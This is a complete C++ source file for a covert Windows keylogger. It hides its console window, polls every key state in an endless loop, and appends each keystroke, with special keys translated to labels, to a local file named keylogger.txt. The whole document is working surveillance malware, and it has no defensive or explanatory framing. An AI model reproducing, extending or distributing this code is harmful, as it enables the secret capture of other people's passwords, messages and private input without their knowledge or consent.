#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

//Log File Path
#define LOG_FILE "keylogger.txt"

// Saves the data into logfile
void saveData(std::string data){
    std::fstream logFile;

    //Open file
    // std::ios::app will make the new data append to the file instead of erase file content
    logFile.open(LOG_FILE, std::ios::app);
    logFile << data;

    //Close file stream
    logFile.close();
}

std::string translateSpecialKeys(int key){
    std::string result;
    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = " \n";
        break;
    case VK_BACK:
        result = "\b";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_TAB:
        result = "\t";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    case VK_ADD:
        result = "+";
        break;
    case VK_CANCEL:
        result = "\b";
        break;
    case VK_DELETE:
        result = "[DELETE]";
        break;
    case VK_DIVIDE:
        result = "/";
        break;
    case VK_DOWN:
        result = "[DOWN]";
        break;
    case VK_UP:
        result = "[UP]";
        break;
    case VK_INSERT:
        result = "[INS]";
        break;
    case VK_ESCAPE:
        result = "[ESC]";
        break;
    case VK_F1:
        result = "[F1]";
        break;
    case VK_F2:
        result = "[F2]";
        break;
    case VK_F3:
        result = "[F3]";
        break;
    case VK_F4:
        result = "[F4]";
        break;
    case VK_F5:
        result = "[F5]";
        break;
    case VK_F6:
        result = "[F6]";
        break;
    case VK_F7:
        result = "[F7]";
        break;
    case VK_F8:
        result = "[F8]";
        break;
    case VK_F9:
        result = "[F9]";
        break;
    case VK_F10:
        result = "[F10]";
        break;
    case VK_F11:
        result = "[F11]";
        break;
    case VK_F12:
        result = "[F]";
        break;
    case VK_PRINT:
        result = "[PRINTSCREEN]";
        break;
    case VK_HOME:
        result = "[HOME]";
        break;
    case VK_MULTIPLY:
        result = "[*]";
        break;
    case VK_SUBTRACT:
        result = "[-]";
        break;
    case VK_LCONTROL:
        result = "[LCTRL]";
        break;
    case VK_LEFT:
        result = "[LEFT ARROW]";
        break;
    case VK_LMENU:
        result = "[LALT]";
        break;
    case VK_LSHIFT:
        result = "[LSHIFT]";
        break;
    case VK_LWIN:
        result = "[LWIN]";
        break;
    case VK_MEDIA_PLAY_PAUSE:
        result = "[MEDIA_PLAY_PAUSE]";
        break;
    case VK_MEDIA_STOP:
        result = "[MEDIA_STOP]";
        break;
    case VK_NEXT:
        result = "[PAGE_DOWN]";
        break;
    case VK_NUMLOCK:
        result = "[NUMLOCK]";
        break;
    case VK_PAUSE:
        result = "[PAUSE]";
        break;
    case VK_PRIOR:
        result = "[PAGE_UP]";
        break;
    case VK_RCONTROL:
        result = "[RCTRL]";
        break;
    case VK_RIGHT:
        result = "[RIGHT ARROW]";
        break;
    case VK_RMENU:
        result = "[RALT]";
        break;
    case VK_RSHIFT:
        result = "[RSHIFT]";
        break;
    case VK_RWIN:
        result = "[RWIN]";
        break;
    case VK_SCROLL:
        result = "[SCROLL_LOCK]";
        break;
    case VK_SLEEP:
        result = "[SLEEP]";
        break;
    case VK_SNAPSHOT:
        result = "[PRS_SCR]";
        break;
    case VK_VOLUME_DOWN:
        result = "[VOL DOWN]";
        break;
    case VK_VOLUME_MUTE:
        result = "[MUTE]";
        break;
    case VK_VOLUME_UP:
        result = "[VOL UP]";
        break;
    default:
        break;
    }
    return result;
}

int main(){
int specKeyArray[]= {VK_SPACE,VK_RETURN,VK_BACK,VK_CAPITAL
        ,VK_SHIFT
        ,VK_TAB
        ,VK_CONTROL
        ,VK_MENU,VK_ADD,VK_CANCEL,VK_DELETE,VK_DIVIDE,VK_DOWN,VK_UP,VK_INSERT,VK_ESCAPE,VK_F1,VK_F2,VK_F3,VK_F4,VK_F5,VK_F6,VK_F7,VK_F8,VK_F9,VK_F10,VK_F11,VK_F12,VK_PRINT,VK_HOME,VK_MULTIPLY,VK_SUBTRACT,VK_LCONTROL,VK_LEFT,VK_LMENU,VK_LSHIFT,VK_LWIN,VK_MEDIA_PLAY_PAUSE,VK_MEDIA_STOP,VK_NEXT,VK_NUMLOCK,VK_PAUSE,VK_PRIOR,VK_RCONTROL,VK_RIGHT,VK_RMENU,VK_RSHIFT,VK_RWIN,VK_SCROLL,VK_SLEEP,VK_SNAPSHOT,VK_VOLUME_DOWN,VK_VOLUME_MUTE,VK_VOLUME_UP};
        std::string specialKeyChar;
        bool isSpecialKey;

    //hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Loop forever
    while(true){
        for(int key =8; key<=190; key++){
            if(GetAsyncKeyState(key)== -32767){
                // key is pressed
                // checkif key is special key
                isSpecialKey = std::find(std::begin(specKeyArray), std::end(specKeyArray), key) != std::end(specKeyArray);
                if(isSpecialKey){
                    specialKeyChar =translateSpecialKeys(key);
                    saveData(specialKeyChar);
                } else {
                    // key is not special key
                    // we need to check if it is uppercase or lowercase
                    if (GetKeyState(VK_CAPITAL)){
                        //Caps lock is on
                        saveData(std::string(1,(char)key));
                    } else {
                        // Caps lock is off
                        // turn the charecter into lowercase before save
                        saveData(std::string(1,(char)std::tolower(key)));
                    }
                }
            }
        }
    }
}